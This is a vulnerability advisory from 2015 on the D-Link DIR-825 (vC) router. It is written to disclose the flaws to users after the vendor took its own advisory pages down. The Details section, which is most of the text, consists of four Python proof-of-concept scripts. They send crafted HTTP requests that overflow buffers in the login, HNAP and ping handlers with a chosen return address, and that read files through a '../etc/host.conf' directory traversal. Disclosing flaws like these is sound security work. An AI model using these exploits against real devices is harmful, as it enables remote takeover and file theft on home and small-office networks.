@@ -1,0 +1,228 @@
+## Advisory Information
+
+Title: DIR-825 (vC) Buffer overflows in authentication,HNAP and ping functionalities. Also a directory traversal 
+
+issue exists which can be exploited
+Vendors contacted: William Brown <william.brown@dlink.com>, Patrick Cline patrick.cline@dlink.com(Dlink)
+CVE: None
+
+Note: All these security issues have been discussed with the vendor and vendor indicated that they have fixed 
+
+issues as per the email communication. The vendor had also released the information on their security advisory 
+
+pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060, 
+http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061
+
+However, the vendor has taken now the security advisory pages down and hence the information needs to be publicly 
+
+accessible so that users using these devices can update the router firmwares.The author (Samuel Huntley) releasing 
+
+this finding is not responsible for anyone using this information for malicious purposes. 
+
+## Product Description
+
+DIR-825 (vC) -- Wireless AC750 Dual Band Gigabit Cloud Router. Mainly used by home and small offices.
+
+## Vulnerabilities Summary
+
+Have come across 4 security issues in DIR-825 firmware which allows an attacker to exploit buffer overflows in 
+
+authentication, HNAP and Ping functionalities. first 2 of the buffer overflows in auth and HNAP  can be exploited 
+
+by an unauthentictaed attacker. The attacker can be on wireless LAN or WAN if mgmt interface is exposed to attack 
+
+directly or using XSRF if not exposed. The ping functionality based buffer overflow and directory traversal would 
+
+require an attacker to be on network and use XSRF to exploit buffer overflow whereas would require some sort of 
+
+authentication as low privileged user atleast to exploit directory traversal.
+
+## Details
+
+Buffer overflow in auth 
+------------------------------------------------------------------------------------------------------------------
+
+----
+import socket
+import struct
+
+
+'''
+287 + XXXX in query_string value, right now only working with Exit address as sleep address has bad chars which 
+
+disallows from using regular shellcode directly
+'''
+
+buf = "GET /dws/api/Login?test="
+buf+="B"*251
+buf+="CCCC" #s0
+buf+="FFFF" #s1
+buf+="FFFF" #s2
+buf+="FFFF" #s3
+buf+="XXXX" #s4
+buf+="HHHH" #s5
+buf+="IIII" #s6
+buf+="JJJJ" #s7
+buf+="LLLL"
+buf+="\x2a\xbc\x8c\xa0" # retn address
+buf+="C"*24 #
+buf+="sh;;" 
+buf+="K"*20
+buf+="\x2a\xc0\xd2\xa0" #s1
+buf+="\x2a\xc0\xd2\xa0" #s1
+buf
+
++="CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+
+CCCCCCCCCCCCCCCCC"
+buf+="&password=A HTTP/1.1\r\nHOST: 10.0.0.90\r\nUser-Agent: test\r\nAccept:text/html,application/xhtml
+
++xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection:keep-alive\r\n\r\n"
+ 
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.0.0.90", 80))
+s.send(buf)
+soc=s.recv(2048)
+print soc
+------------------------------------------------------------------------------------------------------------------
+
+----
+
+
+Buffer overflow in HNAP
+------------------------------------------------------------------------------------------------------------------
+
+----
+import socket
+import struct
+
+
+'''
+4138 + XXXX in SoapAction value, right now only working with Exit address as sleep address has bad chars which 
+
+disallows from using regular shellcode directly
+'''
+
+buf = "POST /HNAP1/ HTTP/1.1\r\n"
+buf+= "Host: 10.0.0.90\r\n"
+buf+="SOAPACTION:http://purenetworks.com/HNAP1/GetDeviceSettings/"+"A"*4138+"\x2a\xbc\x8c\xa0"+"D"*834+"\r\n"
+buf+="Proxy-Connection: keep-alive\r\n"
+buf+="Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\r\n"
+buf+"Cache-Control: max-age=0\r\n"
+buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
+buf+="User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 
+
+Safari/537.36\r\n"
+buf+="Accept-Encoding: gzip,deflate,sdch\r\n"
+buf+="Accept-Language: en-US,en;q=0.8\r\n"
+buf+="Cookie: uid:1111;\r\n"
+buf+="Content-Length: 13\r\n\r\ntest=test\r\n\r\n"
+ 
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.0.0.90", 80))
+s.send(buf)
+soc=s.recv(2048)
+print soc
+------------------------------------------------------------------------------------------------------------------
+
+----
+
+Directory traversal 
+------------------------------------------------------------------------------------------------------------------
+
+----
+import socket
+import struct
+
+
+'''
+Useful to do directory traversal attack which is possible in html_response_page variable below which prints the 
+
+conf file, but theoretically any file, most likely only after login accessible
+'''
+payload="html_response_page=../etc/host.conf&action=do_graph_auth&login_name=test&login_pass=test1&login_n=test2&l
+
+og_pass=test3&graph_code=63778&session_id=test5&test=test"
+buf = "POST /apply.cgi HTTP/1.1\r\n"
+buf+= "Host: 10.0.0.90\r\n"
+buf+="Proxy-Connection: keep-alive\r\n"
+buf+="Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\r\n"
+buf+"Cache-Control: max-age=0\r\n"
+buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
+buf+="User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 
+
+Safari/537.36\r\n"
+buf+="Accept-Encoding: gzip,deflate,sdch\r\n"
+buf+="Accept-Language: en-US,en;q=0.8\r\n"
+buf+="Cookie: session_id=test5;\r\n"
+buf+="Content-Length: "+str(len(payload))+"\r\n\r\n"
+buf+=payload+"\r\n\r\n"
+ 
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.0.0.90", 80))
+s.send(buf)
+soc=s.recv(2048)
+print soc
+------------------------------------------------------------------------------------------------------------------
+
+----
+
+
+Buffer overflow in ping 
+------------------------------------------------------------------------------------------------------------------
+
+----
+import socket
+import struct
+
+
+'''
+282 + XXXX in ping_ipaddr value, right now only working with Exit address as sleep address has bad chars which 
+
+disallows from using regular shellcode directly
+'''
+payload="html_response_page=tools_vct.asp&action=ping_test&html_response_return_page=tools_vct.asp&ping=ping&ping_
+
+ipaddr=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"+"\x2a\xbc\x8c\xa0"+"CCXXXXDDDDEEEE&test=test"
+buf = "POST /ping_response.cgi HTTP/1.1\r\n"
+buf+= "Host: 10.0.0.90\r\n"
+buf+="Proxy-Connection: keep-alive\r\n"
+buf+="Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\r\n"
+buf+"Cache-Control: max-age=0\r\n"
+buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
+buf+="User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 
+
+Safari/537.36\r\n"
+buf+="Accept-Encoding: gzip,deflate,sdch\r\n"
+buf+="Accept-Language: en-US,en;q=0.8\r\n"
+buf+="Cookie: session_id=test5;\r\n"
+buf+="Content-Length: "+str(len(payload))+"\r\n\r\n"
+buf+=payload+"\r\n\r\n"
+ 
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.0.0.90", 80))
+s.send(buf)
+soc=s.recv(2048)
+print soc
+ 
+------------------------------------------------------------------------------------------------------------------
+
+----
+
+## Report Timeline
+
+* April 26, 2015: Vulnerability found by Samuel Huntley and reported to William Brown and Patrick Cline.
+* July 17, 2015: Vulnerability was fixed by Dlink as per the email sent by the vendor
+* Nov 13, 2015: A public advisory is sent to security mailing lists.
+
+## Credit
+
+This vulnerability was found by Samuel Huntley
